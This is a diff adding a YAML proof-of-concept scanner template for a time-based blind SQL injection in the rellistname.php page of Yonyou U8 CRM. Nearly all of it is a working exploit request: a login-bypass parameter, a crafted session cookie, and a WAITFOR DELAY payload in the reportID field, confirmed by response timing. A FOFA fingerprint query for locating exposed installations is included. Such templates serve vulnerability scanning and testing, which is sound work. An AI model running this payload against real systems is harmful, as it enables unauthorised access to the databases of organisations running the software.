@@ -1,0 +1,19 @@
+id: poc-yaml-yongyon-u8-crm-rellistname-php-sqli
+info:
+  name: 用友U8 CRM rellistname.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8+CRM
+  fofa: body="用友U8CRM"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /config/rellistname.php?DontCheckLogin=1&objType=1&reportID=1+wAiTFOR+DeLAy'0:0:{{.t1}}'--+-
+  headers:
+    Cookie: PHPSESSID=bgsesstimeout-;
+  expression: status_code == 200 && contains(title,"用友U8CRM") && contains(body,"url:")
+    && duration > t1 && duration < t2
+transport: http
